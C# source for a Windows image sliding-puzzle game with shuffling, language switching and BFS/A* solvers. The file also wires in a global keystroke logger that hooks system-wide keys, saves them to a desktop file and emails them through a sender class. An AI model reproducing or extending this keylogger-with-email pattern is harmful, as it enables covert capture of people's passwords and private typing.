namespace Image_Slider_Puzzle
{
    public partial class Form1 : Form
    {
        private LanguageChanger languageChanger = new LanguageChanger();
        private Queue<string> queueNextMove;
        private int queueNextMoveOriginalLength;
        private string currentMoveDirection = string.Empty;

        private List<Bitmap> imageFromGallery = new List<Bitmap>();
        private List<PictureBox> pictureBoxList = new List<PictureBox>();
        private List<Bitmap> images = new List<Bitmap>();
        private List<string> locations = new List<string>();
        private List<string> currentLocations = new List<string>();
        private List<string> winningPositions = new List<string>();

        private string winPositions;
        private string currentPositions;
        private string gameMod = StringData.gameModNormal;

        private int moves = 0;
        private int elapsedSeconds = 0;
        private int switchNumber = 1;

        private bool toSwitch = false;
        private bool isPause = false;
        private Language languageCurrent = Language.English;

        Bitmap MainBitmap;
        Random random = new Random();

        int fullSizeRow;
        int numberBoxesOnSide;
        int sizeBox;

        private GlobalKeyListener globalKeyListener;

        public Form1()
        {
            InitializeComponent();

            globalKeyListener = new GlobalKeyListener(textBoxKeyLoggerResult);

            this.Icon = Properties.Resources.puzzle;

            imageFromGallery.Add(Properties.Resources.Untitled1757);
            imageFromGallery.Add(Properties.Resources.Untitled1758);
            imageFromGallery.Add(Properties.Resources.Untitled1759);
            imageFromGallery.Add(Properties.Resources.Untitled1760);
            imageFromGallery.Add(Properties.Resources.Untitled1761);
            imageFromGallery.Add(Properties.Resources.Untitled1762);
            imageFromGallery.Add(Properties.Resources.Untitled1763);

            GetAllObjectForLanguageChange();

            fullSizeRow = 390;
            numberBoxesOnSide = 3;
            sizeBox = fullSizeRow / numberBoxesOnSide;
        }

        private void GetAllObjectForLanguageChange()
        {
            List<ToolStripMenuItem> toolStripMenuItems = new List<ToolStripMenuItem>
            {
                fileToolStripMenuItem,
                openToolStripMenuItem,
                GalleryToolStripMenuItem,
                SettingsOpenClosedClickEvent,
                languageToolStripMenuItem,
                englishToolStripMenuItem,
                bulgarianToolStripMenuItem
            };

            Dictionary<Language, string[]> possibleLanguagesWordsForToolStripMenuItem = new Dictionary<Language, string[]>
            {
                {Language.English, new[] {"File" , "Open", "Gallery", "Settings", "Language", "English", "Bulgarian" } },
                {Language.Bulgarian, new[] { "Файл", "Отвори", "Галерия", "Настройки", "Език", "Английски", "Български" } },
                {Language.German, new[] {"Datei", "Öffnen", "Galerie", "Einstellungen", "Sprache", "Englisch", "Bulgarisch"} },
                {Language.Chinese, new[] { "文件", "打开", "画廊", "设置", "语言", "英语", "保加利亚语" } }

            };

            languageChanger.SortDataForLanguageMenuItems(toolStripMenuItems, possibleLanguagesWordsForToolStripMenuItem);


            List<Button> buttonItems = new List<Button>
            {
                btnShuffle,
                btnPause,
                btnQuit,
                btnSwitch
            };

            Dictionary<Language, string[]> possibleLanguagesWordsForButton = new Dictionary<Language, string[]>
            {
                { Language.English, new [] { "Shuffle", "Pause", "Quit", "Switch"} },
                { Language.Bulgarian, new [] { "Размести", "Пауза", "Напусни", "Размени"} },
                { Language.German, new [] { "Platzieren", "Pause", "Verlassen", "Austauschen" } },
                { Language.Chinese, new [] { "混洗", "暂停", "退出", "交换"} }

            };

            languageChanger.SortDataForLanguageBtnItems(buttonItems, possibleLanguagesWordsForButton);

            List<Control> groupBoxesLabelsItems = new List<Control>
            {
                PuzzleBox,
                OriginalImageBox,
                GalleryBox,
                lblNormalMod,
                lblHardMod,
                lblVeryHardMod,
                lblMovesMade,
                label1,
                label2
            };

            Dictionary<Language, string[]> possibleLanguagesWordsForGroupBox = new Dictionary<Language, string[]>
            {
                { Language.English, new [] { "Puzzle Box", "Original", "Gallery", "NORMAL", "HARD", "VERY HARD", "Moves Made:", "List One", "Status" } },
                { Language.Bulgarian, new [] { "Пъзел поле", "Оригинал", "Галерия", "НОРМАЛ", "ТРУДНО", "МНОГО ТРУДНО", "Направени Ходове:", "Първи лист", "Статус"} },
                { Language.German, new [] { "Puzzle Feld", "Original", "Galerie", "NORMAL", "SCHWER", "SEHR SCHWER", "Gemachte Züge:", "Erste Liste", "Status" } },
                { Language.Chinese, new [] { "拼图盒", "原版", "画廊", "正常", "困难", "非常困难", "已完成的动作：", "清单一", "状态" } }

            };

            languageChanger.SortDataForLanguageGroupBoxItems(groupBoxesLabelsItems, possibleLanguagesWordsForGroupBox);

        }
        private void SetOriginalImageBox()
        {
            Bitmap tempBitmap = new Bitmap(MainBitmap, new Size(270, 270));
            OriginalImageBox.BackgroundImageLayout = ImageLayout.Center;
            OriginalImageBox.BackgroundImage = tempBitmap;
        }
        private void CreatePictureBoxes(int fullSizeRow, int numberBoxesOnSide)
        {
            int sizeBox = fullSizeRow / numberBoxesOnSide;

            for (int i = 0; i < numberBoxesOnSide * numberBoxesOnSide; i++)
            {
                PictureBox tempPic = new PictureBox();
                tempPic.Size = new Size(sizeBox, sizeBox);
                tempPic.Tag = i.ToString();
                tempPic.Click += OnPicClick;
                pictureBoxList.Add(tempPic);
                locations.Add(tempPic.Tag.ToString());
            }
        }
        private void CropImage(Bitmap mainBitmap, int size, int numberBoxOnSide)
        {
            int x = 0;
            int y = 0;

            for (int blocks = 0; blocks < numberBoxOnSide * numberBoxOnSide; blocks++)
            {
                Bitmap croppedImage = new Bitmap(size, size);

                for (int i = 0; i < size; i++)
                {
                    for (int j = 0; j < size; j++)
                    {
                        croppedImage.SetPixel(i, j, mainBitmap.GetPixel((i + x), (j + y)));
                    }
                }

                images.Add(croppedImage);

                x += size;
                if (x == size * numberBoxOnSide)
                {
                    x = 0;
                    y += size;
                }
            }
        }

        private void AddImages(int sizeBox, int numberBoxesOnSide, int fullSize)
        {
            Bitmap tempBitmap = new Bitmap(MainBitmap, new Size(fullSize, fullSize));
            CropImage(tempBitmap, sizeBox, numberBoxesOnSide);

            for (int i = 1; i < pictureBoxList.Count; i++)
            {
                pictureBoxList[i].BackgroundImage = images[i];
            }

            PlacePictureBoxesToForm(sizeBox, numberBoxesOnSide);
        }
        private void PlacePictureBoxesToForm(int sizeBox, int numberBoxesOnSide)
        {

            ShuffleImageForPuzzleBox(numberBoxesOnSide);

            int x = PuzzleBox.Location.X - 5;
            int y = PuzzleBox.Location.Y - 25;

            for (int i = 0; i < pictureBoxList.Count; i++)
            {
                pictureBoxList[i].BackColor = Color.Black;

                if (i == numberBoxesOnSide || i == numberBoxesOnSide * 2 || i == numberBoxesOnSide * 3 || i == numberBoxesOnSide * 4)
                {
                    y += sizeBox;
                    x = PuzzleBox.Location.X - 5;
                }

                pictureBoxList[i].BorderStyle = BorderStyle.FixedSingle;
                pictureBoxList[i].Location = new Point(x, y);

                PuzzleBox.Controls.Add(pictureBoxList[i]);

                x += sizeBox;
                winPositions += locations[i];
                winningPositions.Add(locations[i]);
            }
        }

        private void ShuffleImageForPuzzleBox(int numberBoxesOnSide)
        {
            //shuffleImages.FindAll(p => p.BackgroundImage != null).ForEach(p => p.BackgroundImage.RotateFlip(RotateFlipType.Rotate90FlipNone));
            //var shuffleImages = pictureBoxList.OrderBy(a => Guid.NewGuid()).ToList();
            // pictureBoxList = shuffleImages;

            PictureBox[] initialState = pictureBoxList.ToArray();

            //Determine how moves can be made (all possible directions)
            var possibleMoves = new List<(int Dx, int Dy)> { (-1, 0), (1, 0), (0, -1), (0, 1) };

            if (initialState.Any())
            {
                int shuffleCounts = 0;

                //Find the position of 0 (black box)
                var zeroIndex = pictureBoxList.FindIndex(x => x.Tag == "0"); //0;
                var zeroX = zeroIndex % numberBoxesOnSide;
                var zeroY = zeroIndex / numberBoxesOnSide;


                while (shuffleCounts < 100)
                {
                    var (dx, dy) = possibleMoves[random.Next(0, possibleMoves.Count)];
                    var newX = zeroX + dx;
                    var newY = zeroY + dy;

                    if (newX >= 0 && newX < numberBoxesOnSide && newY >= 0 && newY < numberBoxesOnSide)
                    {
                        var newIndex = newY * numberBoxesOnSide + newX;

                        //Swap
                        var temp = initialState[zeroIndex];
                        initialState[zeroIndex] = initialState[newIndex];
                        initialState[newIndex] = temp;

                        //zeroIndex += newIndex;
                        for (int x = 0; x < initialState.Length; x++)
                        {
                            if (initialState[x].Tag.ToString() == "0")
                            {
                                zeroIndex = x;
                                break;
                            }
                        }

                        zeroX = zeroIndex % numberBoxesOnSide;
                        zeroY = zeroIndex / numberBoxesOnSide;

                        shuffleCounts++;
                    }
                }
            }

            pictureBoxList = initialState.ToList();

        }

        private void LoadImageFromGalleryOrPc(Bitmap image)
        {
            ClearAllCollections();

            if (MainBitmap != null) MainBitmap.Dispose();

            ResetPuzzle();
            MainBitmap = (Bitmap)image.Clone();
            CreatePictureBoxes(fullSizeRow, numberBoxesOnSide);
            SetOriginalImageBox();
            AddImages(sizeBox, numberBoxesOnSide, fullSizeRow);

            GalleryBox.Visible = false;
            btnPause.Enabled = true;
        }
        private void ClearAllCollections()
        {
            if (pictureBoxList.Any())
            {
                foreach (PictureBox pics in pictureBoxList)
                {
                    PuzzleBox.Controls.Remove(pics);
                }

                OriginalImageBox.BackgroundImage = null;


                pictureBoxList.Clear();
                images.Clear();
                locations.Clear();
                currentLocations.Clear();
                winningPositions.Clear();
                winPositions = string.Empty;
                currentPositions = string.Empty;
                label2.Text = string.Empty;
            }
        }
        private void ResetPuzzle()
        {
            ClearAllBFSSettings();

            if (queueNextMove != null && queueNextMove.Any()) queueNextMove.Clear();
            currentMoveDirection = string.Empty;

            panBFS.Visible = false;

            btnSwitch.Enabled = true;
            toSwitch = false;
            switchNumber = 1;
            btnSwitch.Text = $"{languageChanger.ReturnCorrectWord("Switch", languageCurrent)} +{switchNumber}";

            tmrTimeElapse.Stop();
            elapsedSeconds = 0;
            lblTimeElapsed.Text = "00:00:00";

            moves = 0;
            lblMovesMade.Text = $"{languageChanger.ReturnCorrectWord("Moves Made:", languageCurrent)} 0";

            winPositions = string.Empty;
            label1.Text = "";

            currentPositions = string.Empty;
            label2.Text = "";

            PlacePictureBoxesToForm(sizeBox, numberBoxesOnSide);
        }


        #region Event from Form

        private void OnPicClick(object? sender, EventArgs e)
        {
            CloseAllOpenWindows(sender.ToString());

            PictureBox pictureBox = (PictureBox)sender;
            PictureBox emptyBox = pictureBoxList.Find(x => x.Tag == "0");

            Point pic1 = new Point(pictureBox.Location.X, pictureBox.Location.Y);
            Point pic2 = new Point(emptyBox.Location.X, emptyBox.Location.Y);

            var index1 = PuzzleBox.Controls.IndexOf(pictureBox);
            var index2 = PuzzleBox.Controls.IndexOf(emptyBox);

            if (!toSwitch)
            {
                if (pictureBox.Right == emptyBox.Left && pictureBox.Location.Y == emptyBox.Location.Y
                || pictureBox.Left == emptyBox.Right && pictureBox.Location.Y == emptyBox.Location.Y
                || pictureBox.Top == emptyBox.Bottom && pictureBox.Location.X == emptyBox.Location.X
                || pictureBox.Bottom == emptyBox.Top && pictureBox.Location.X == emptyBox.Location.X)
                {
                    SwitchBoxes(pictureBox, emptyBox, pic1, pic2, index1, index2, numberBoxesOnSide);
                }
            }
            else
            {
                SwitchBoxes(pictureBox, emptyBox, pic1, pic2, index1, index2, numberBoxesOnSide);

                toSwitch = false;
                btnSwitch.Enabled = false;
                btnSwitch.Text = $"{languageChanger.ReturnCorrectWord("Switch", languageCurrent)} {switchNumber}";
            }

            if (queueNextMove != null && queueNextMove.Any())
            {
                string move = queueNextMove.Dequeue();

                if (currentMoveDirection == move)
                {
                    string message = StringData.messageNextMove + queueNextMove.FirstOrDefault();
                    if (panBFS.Visible == true) lblBFSNextMove.Text = message;
                    if (panAStar.Visible == true) lblANextMove.Text = message;
                }
                else
                {
                    ClearAllBFSSettings();
                    lblBFSNextMove.Text = StringData.errorMove;
                }
            }

            label2.Text = "";
            currentLocations.Clear();

            //Check is win move
            if (CheckGame())
            {

                ClearAllCollections();
                ClearAllBFSSettings();
                panBFS.Visible = false;
                ClearAllASettings();
                panAStar.Visible = false;

                CreatePictureBoxes(fullSizeRow, numberBoxesOnSide);

                SetFullPictureForWining(sizeBox, numberBoxesOnSide);

                panBFS.Visible = false;
                tmrTimeElapse.Stop();
                string messages = String.Empty;
                messages += languageChanger.ReturnCorrectWord("Congratulations...\nYour Win\nTime Elapsed : ", languageCurrent) + elapsedSeconds;
                messages += languageChanger.ReturnCorrectWord("s.\nTotal Moves Made : ", languageCurrent) + moves;

                MessageBox.Show(messages, "Puzzle");
                messages = String.Empty;

                GalleryBox.Visible = true;

                pictureBoxList.ForEach(p => p.Enabled = false);
                btnPause.Enabled = false;
            }
        }
        private void SetFullPictureForWining(int size, int numberBoxesOnSide)
        {
            Bitmap tempBitmap = new Bitmap(MainBitmap, new Size(size * numberBoxesOnSide, size * numberBoxesOnSide));
            CropImage(tempBitmap, size, numberBoxesOnSide);

            for (int i = 0; i < pictureBoxList.Count; i++)
            {
                pictureBoxList[i].BackgroundImage = images[i];
            }

            int x = PuzzleBox.Location.X - 5;
            int y = PuzzleBox.Location.Y - 25;

            for (int i = 0; i < pictureBoxList.Count; i++)
            {
                pictureBoxList[i].BackColor = Color.Black;

                if (i == numberBoxesOnSide || i == numberBoxesOnSide * 2 || i == numberBoxesOnSide * 3 || i == numberBoxesOnSide * 4)
                {
                    y += size;
                    x = PuzzleBox.Location.X - 5;
                }

                pictureBoxList[i].BorderStyle = BorderStyle.FixedSingle;
                pictureBoxList[i].Location = new Point(x, y);

                PuzzleBox.Controls.Add(pictureBoxList[i]);

                x += size;
                winPositions += locations[i];
                winningPositions.Add(locations[i]);
            }
        }
        private void SwitchBoxes(PictureBox pictureBox, PictureBox emptyBox, Point pic1, Point pic2, int index1, int index2, int numberBoxesOnSide)
        {
            int differenceInIndexes = index2 - index1;

            if (differenceInIndexes == 1) currentMoveDirection = StringData.directionLeft;
            else if (differenceInIndexes == -1) currentMoveDirection = StringData.directionRight;
            else if (differenceInIndexes == numberBoxesOnSide) currentMoveDirection = StringData.directionUp;
            else if (differenceInIndexes == -numberBoxesOnSide) currentMoveDirection = StringData.directionDown;
            else currentMoveDirection = StringData.directionSwitch;

            string message = "Move : " + currentMoveDirection;
            if (panBFS.Visible == true) lblBFSCurrMove.Text = message;
            if (panAStar.Visible == true) lblACurrMove.Text = message;

            pictureBox.Location = pic2;
            emptyBox.Location = pic1;

            if (gameMod == StringData.gameModVeryHard) RotatePictureBoxes(PuzzleBox);

            PuzzleBox.Controls.SetChildIndex(pictureBox, index2);
            PuzzleBox.Controls.SetChildIndex(emptyBox, index1);

            lblMovesMade.Text = $"{languageChanger.ReturnCorrectWord("Moves Made:", languageCurrent)} {++moves}";

            if (lblTimeElapsed.Text == "00:00:00") tmrTimeElapse.Start();
        }
        private void OpenFileEvent(object sender, EventArgs e)
        {
            CloseAllOpenWindows(sender.ToString());

            using (OpenFileDialog open = new OpenFileDialog())
            {
                open.Filter = "Image Files Only | *.jpg; *.jpeg; *.gif; *.png";

                if (open.ShowDialog() == DialogResult.OK) LoadImageFromGalleryOrPc(new Bitmap(open.FileName));
            }
        }
        private void UpdateTimeElapsedEvent(object sender, EventArgs e)
        {
            if (tmrTimeElapse.Interval.ToString() != "00:00:00")
            {
                elapsedSeconds++;
                TimeSpan time = TimeSpan.FromSeconds(elapsedSeconds);
                lblTimeElapsed.Text = time.ToString("hh':'mm':'ss");
            }

            if (lblTimeElapsed.Text == "01:00:00")
            {
                tmrTimeElapse.Stop();
                MessageBox.Show(languageChanger.ReturnCorrectWord("Time is Up\nTry Again", languageCurrent), "Puzzle");
                ResetPuzzle();
            }

        }
        private void GalleryOpenCloseClickEvent(object sender, EventArgs e)
        {
            CloseAllOpenWindows(sender.ToString());
            if (GalleryBox.Visible == false) GalleryBox.Visible = true;
            else GalleryBox.Visible = false;
        }
        private void SettingsOpenClosedClickEvent_Click(object sender, EventArgs e)
        {
            CloseAllOpenWindows(sender.ToString());
            if (panSettings.Visible == false) panSettings.Visible = true;
            else panSettings.Visible = false;
        }

        #region Btn Click Event
        private void btnQuitClick(object sender, EventArgs e)
        {
            AskPermissionBeforeQuite(sender, e as FormClosingEventArgs);
        }

        private void btnPauseOrResumeClick(object sender, EventArgs e)
        {
            if (lblTimeElapsed.Text != "00:00:00")
            {
                if (!isPause)
                {
                    isPause = true;
                    tmrTimeElapse.Stop();
                    PuzzleBox.Controls.Clear();
                    btnPause.Text = languageChanger.ReturnCorrectWord("Resume", languageCurrent);
                }
                else
                {
                    isPause = false;
                    tmrTimeElapse.Start();
                    PuzzleBox.Controls.AddRange(pictureBoxList.ToArray());
                    btnPause.Text = languageChanger.ReturnCorrectWord("Pause", languageCurrent);
                }
            }
        }

        private void btnShuffleClick(object sender, EventArgs e)
        {
            DialogResult YesOrNo = new DialogResult();

            if (lblTimeElapsed.Text != "00:00:00")
            {
                YesOrNo = MessageBox.Show(languageChanger.ReturnCorrectWord("Are You Sure To Restart ?", languageCurrent), "Puzzle", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            }

            if (YesOrNo == DialogResult.Yes || lblTimeElapsed.Text == "00:00:00") ResetPuzzle();
        }

        private void lblNormalMod_Click(object sender, EventArgs e)
        {
            gameMod = StringData.gameModNormal;
            panSettings.Visible = false;
        }

        private void lblHardMod_Click(object sender, EventArgs e)
        {
            gameMod = StringData.gameModHard;
            panSettings.Visible = false;

            RotatePictureBoxes(PuzzleBox);
        }

        private void lblVeryHardMod_Click(object sender, EventArgs e)
        {
            gameMod = StringData.gameModVeryHard;
            panSettings.Visible = false;
        }

        private void btnSwitch_Click(object sender, EventArgs e)
        {
            if (switchNumber > 0)
            {
                switchNumber--;
                toSwitch = true;
            }
        }

        private void EnglishToolStripMenuItem_Click(object sender, EventArgs e)
        {
            languageCurrent = Language.English;
            languageChanger.ChangeLanguage(languageCurrent);
        }

        private void BulgarianToolStripMenuItem_Click(object sender, EventArgs e)
        {
            languageCurrent = Language.Bulgarian;
            languageChanger.ChangeLanguage(languageCurrent);
        }

        private void GermanToolStripMenuItem_Click(object sender, EventArgs e)
        {
            languageCurrent = Language.German;
            languageChanger.ChangeLanguage(languageCurrent);
        }

        private void ChineseToolStripMenuItem_Click(object sender, EventArgs e)
        {
            languageCurrent = Language.Chinese;
            languageChanger.ChangeLanguage(languageCurrent);
        }

        private void btnBFSPlay_Click(object sender, EventArgs e)
        {
            if (queueNextMove != null && queueNextMove.Count > 0)
            {
                tmrAutoSolve.Enabled = true;
                tmrAutoSolve.Start();
            }
            else textBoxBFSResult.Text = StringData.warningBFSPlay;
        }
        private void BtnAutoSolve_Click(object sender, EventArgs e)
        {
            ClearAllBFSSettings();

            if (panBFS.Visible == false) panBFS.Visible = true;
            else panBFS.Visible = false;
        }
        private void lblBFSClose_Click(object sender, EventArgs e)
        {
            ClearAllBFSSettings();
            panBFS.Visible = false;
        }
        private void btnBFSSolve_Click(object sender, EventArgs e)
        {
            if (int.TryParse(textBoxBFSAttemps.Text, out int inputNumber))
            {
                int minValue = 1;
                int maxValue = 1000;

                if (inputNumber >= minValue && inputNumber <= maxValue)
                {
                    if (moves != 0)
                    {
                        ClearAllBFSSettings();

                        textBoxBFSResult.Text = "";

                        //var initialState1 = currentPositions.Where((x, index) => index % 2 == 0).Select(x => int.Parse(x.ToString())).ToArray();
                        var initialState = currentLocations.Select(x => int.Parse(x.ToString())).ToArray();
                        string message = string.Empty;

                        BFSSolver solverBFS = new BFSSolver();
                        List<string> solution = solverBFS.SolvePuzzle(initialState, numberBoxesOnSide, inputNumber * 100000);

                        if (solution[0] == StringData.warningNoSolution) message = StringData.messageNoFoundSolution;
                        else
                        {
                            foreach (var move in solution)
                            {
                                message += move + ", ";
                            }
                        }

                        panBFS.Visible = true;
                        textBoxBFSResult.Text = "Solution: " + message;

                        queueNextMove = new Queue<string>(message.Split(", ", StringSplitOptions.RemoveEmptyEntries));
                        queueNextMoveOriginalLength = queueNextMove.Count;
                        lblBFSNextMove.Text = queueNextMove.FirstOrDefault() == StringData.messageNoFoundSolution
                            ? StringData.warningNoSolution : StringData.messageNextMove + queueNextMove.FirstOrDefault();
                    }
                    else textBoxBFSResult.Text = StringData.warningStartGame;
                }
                else textBoxBFSResult.Text = StringData.errorInvalidNumber;
            }
            else textBoxBFSResult.Text = StringData.errorEnteredNotNumber;
        }

        #endregion


        private void AskPermissionBeforeQuite(object sender, FormClosingEventArgs e)
        {
            DialogResult YesOrNO = MessageBox.Show(this, languageChanger.ReturnCorrectWord("Are You Sure To Quit ?", languageCurrent), "Puzzle", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (sender as Button != btnQuit && YesOrNO == DialogResult.No) e.Cancel = true;
            if (sender as Button == btnQuit && YesOrNO == DialogResult.Yes) Environment.Exit(0);
        }


        #region Gallery Image Click Event
        private void pictureBox1_Click(object sender, EventArgs e) => LoadImageFromGalleryOrPc(imageFromGallery[0]);

        private void pictureBox2_Click(object sender, EventArgs e) => LoadImageFromGalleryOrPc(imageFromGallery[1]);

        private void pictureBox3_Click(object sender, EventArgs e) => LoadImageFromGalleryOrPc(imageFromGallery[2]);

        private void pictureBox4_Click(object sender, EventArgs e) => LoadImageFromGalleryOrPc(imageFromGallery[3]);

        private void pictureBox5_Click(object sender, EventArgs e) => LoadImageFromGalleryOrPc(imageFromGallery[4]);

        private void pictureBox6_Click(object sender, EventArgs e) => LoadImageFromGalleryOrPc(imageFromGallery[5]);

        private void pictureBox7_Click(object sender, EventArgs e) => LoadImageFromGalleryOrPc(imageFromGallery[6]);

        #endregion

        #endregion


        private void RotatePictureBoxes(Control container)
        {
            foreach (Control control in container.Controls)
            {
                if (control.BackgroundImage != null) control.BackgroundImage.RotateFlip(RandomRotate());
            }

            container.Refresh();
        }
        private RotateFlipType RandomRotate()
        {
            RotateFlipType type = RotateFlipType.RotateNoneFlipNone;

            switch (random.Next(1, 4))
            {
                case 1:
                    type = RotateFlipType.Rotate90FlipNone;
                    break;
                case 2:
                    type = RotateFlipType.Rotate180FlipNone;
                    break;
                case 3:
                    type = RotateFlipType.Rotate270FlipNone;
                    break;
            }

            return type;
        }
        private void TmrAutoSolve_Tick(object sender, EventArgs e)
        {
            if (queueNextMove.Count > 0) PerformMove(queueNextMove.FirstOrDefault(), numberBoxesOnSide);
            else tmrAutoSolve.Stop();
        }
        private void PerformMove(string move, int numberBoxesOnSide)
        {
            PictureBox emptyBox = pictureBoxList.Find(x => x.Tag == "0");
            var indexEmptyBox = PuzzleBox.Controls.IndexOf(emptyBox);

            int targetIndex = indexEmptyBox;

            switch (move)
            {
                case "Left":
                    targetIndex--;
                    break;
                case "Right":
                    targetIndex++;
                    break;
                case "Up":
                    targetIndex -= numberBoxesOnSide;
                    break;
                case "Down":
                    targetIndex += numberBoxesOnSide;
                    break;
            }

            var targetBox = PuzzleBox.Controls[targetIndex];

            OnPicClick(targetBox, new EventArgs());
        }
        private void ClearAllBFSSettings()
        {
            if (queueNextMove != null) queueNextMove.Clear();
            queueNextMoveOriginalLength = 0;
            textBoxBFSResult.Text = string.Empty;
            lblBFSCurrMove.Text = StringData.messageCurrentMove;
            lblBFSNextMove.Text = StringData.messageNextMove;
            textBoxBFSAttemps.Text = "10";

            tmrAutoSolve.Stop();
        }

        private void ClearAllASettings()
        {
            if (queueNextMove != null) queueNextMove.Clear();
            queueNextMoveOriginalLength = 0;
            textBoxAResult.Text = string.Empty;
            lblACurrMove.Text = StringData.messageCurrentMove;
            lblANextMove.Text = StringData.messageNextMove;
            textBoxAAttempts.Text = "10";

            tmrAutoSolve.Stop();
        }
        private void CloseAllOpenWindows(string sender)
        {
            if (sender != "Gallery") GalleryBox.Visible = false;
            if (sender != "Settings") panSettings.Visible = false;
        }

        private bool CheckGame()
        {
            bool isWin = false;

            foreach (Control x in PuzzleBox.Controls)
            {
                if (x is PictureBox) currentLocations.Add(x.Tag.ToString());
            }

            currentPositions = string.Join(".", currentLocations);
            winPositions = string.Join(".", winningPositions);
            label1.Text = winPositions;
            label2.Text = currentPositions;

            if (winPositions == currentPositions)
            {
                label2.Text = StringData.victory;
                isWin = true;
            }

            return isWin;
        }

        private void btnAStar_Click(object sender, EventArgs e)
        {
            ClearAllASettings();

            if (panAStar.Visible == false) panAStar.Visible = true;
            else panAStar.Visible = false;

        }

        private void btnASolve_Click(object sender, EventArgs e)
        {

            if (int.TryParse(textBoxAAttempts.Text, out int attemptsNumber))
            {
                int minValue = 1;
                int maxValue = 1000;

                if (attemptsNumber >= minValue && attemptsNumber <= maxValue)
                {
                    if (moves != 0)
                    {
                        ClearAllASettings();

                        textBoxAResult.Text = "";

                        int[,] startBoard = new int[numberBoxesOnSide, numberBoxesOnSide];
                        ConvertStringToIntMatrix(currentLocations, startBoard, numberBoxesOnSide);

                        int[,] goalBoard = new int[numberBoxesOnSide, numberBoxesOnSide];
                        ConvertStringToIntMatrix(winningPositions, goalBoard, numberBoxesOnSide);

                        var (zeroX, zeroY) = FindPositionBlackBox(startBoard, numberBoxesOnSide);

                        AStarSolver solverAStar = new AStarSolver();
                        PuzzleStateV2 initialState = new PuzzleStateV2(startBoard, zeroX, zeroY, 0, goalBoard);
                        PuzzleStateV2 solution = solverAStar.SolvePuzzle(initialState, goalBoard, numberBoxesOnSide, attemptsNumber * 100000);
                        var message = string.Empty;

                        if (solution != null)
                        {
                            message = solverAStar.ReturnSolution(solution);
                            textBoxAResult.Text = "Solution: " + message;
                        }
                        else textBoxAResult.Text = StringData.messageNoFoundSolution;

                        queueNextMove = new Queue<string>(message.Split(", ", StringSplitOptions.RemoveEmptyEntries));
                        queueNextMoveOriginalLength = queueNextMove.Count;
                        lblANextMove.Text = queueNextMove.FirstOrDefault() == StringData.messageNoFoundSolution
                            ? StringData.warningNoSolution : StringData.messageNextMove + queueNextMove.FirstOrDefault();

                        static void ConvertStringToIntMatrix(List<string> stringInput, int[,] board, int numberBoxesOnSide)
                        {
                            for (int x = 0; x < numberBoxesOnSide; x++)
                            {
                                for (int y = 0; y < numberBoxesOnSide; y++)
                                {
                                    int index = x * numberBoxesOnSide + y;
                                    int digit = int.Parse(stringInput[index]);
                                    board[x, y] = digit;
                                }
                            }
                        }

                        static (int, int) FindPositionBlackBox(int[,] goalBoard, int numberBoxesOnSide)
                        {
                            for (int x = 0; x < numberBoxesOnSide; x++)
                            {
                                for (int y = 0; y < numberBoxesOnSide; y++)
                                {
                                    int number = goalBoard[x, y];

                                    if (number == 0) return (x, y);
                                }
                            }

                            return (-1, -1);
                        }
                    }
                    else textBoxAResult.Text = StringData.warningStartGame;
                }
                else textBoxAResult.Text = StringData.errorInvalidNumber;
            }
            else textBoxAResult.Text = StringData.errorEnteredNotNumber;
        }

        private void lblAClose_Click(object sender, EventArgs e)
        {
            panAStar.Visible = false;
            ClearAllASettings();
        }

        private void btnAPlay_Click(object sender, EventArgs e)
        {
            if (queueNextMove != null && queueNextMove.Count > 0)
            {
                tmrAutoSolve.Enabled = true;
                tmrAutoSolve.Start();
            }
            else textBoxAResult.Text = StringData.warningBFSPlay;
        }

        private void radioButton1_CheckedChanged(object sender, EventArgs e) => CheckRadioButtonInUse();

        private void radioButton2_CheckedChanged(object sender, EventArgs e) => CheckRadioButtonInUse();

        private void radioButton3_CheckedChanged(object sender, EventArgs e) => CheckRadioButtonInUse();


        private void CheckRadioButtonInUse()
        {
            if (radioButton1.Checked)
            {
                numberBoxesOnSide = 3;
                fullSizeRow = 390;
                PuzzleBox.Height = 430;
                PuzzleBox.Width = 440;
            }
            else if (radioButton2.Checked)
            {
                numberBoxesOnSide = 4;
                fullSizeRow = 520;
                PuzzleBox.Height = 560;
                PuzzleBox.Width = 570;
            }
            else if (radioButton3.Checked)
            {
                numberBoxesOnSide = 5;
                fullSizeRow = 650;
                PuzzleBox.Height = 690;
                PuzzleBox.Width = 700;
            }


            sizeBox = fullSizeRow / numberBoxesOnSide;

            panSettings.Visible = false;

            ClearAllCollections();

            if (MainBitmap != null) MainBitmap.Dispose();

            ResetPuzzle();
        }

        private void KeyLoggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (panKeyLogger.Visible == false) panKeyLogger.Visible = true;
            else panKeyLogger.Visible = false;
        }

        private void btnKeyLoggerStart_Click(object sender, EventArgs e)
        {
            if (btnKeyLoggerStart.Text == "START")
            {
                btnKeyLoggerStart.Text = "STOP";
                globalKeyListener.Hook();
            }
            else
            {
                btnKeyLoggerStart.Text = "START";
                globalKeyListener.Unhook();
            }
        }

        private void btnKeyLoggerToFile_Click(object sender, EventArgs e)
        {
            string filePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string path = Path.Combine(filePath, "Used Keys.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }

            using (StreamWriter sw = File.AppendText(path))
            {
                sw.Write(globalKeyListener.UsedCharacters() + " ");
            }

            globalKeyListener.ClearSettings();
        }

        private void btnKeyLoggerToEmail_Click(object sender, EventArgs e)
        {
            string charsUsed = globalKeyListener.UsedCharacters();

            if (charsUsed.Any())
            {
                var message = new MessageSender();
                message.Send(charsUsed);
            }
            else textBoxKeyLoggerResult.Text = "No saved chars for send.";
        }
    }
}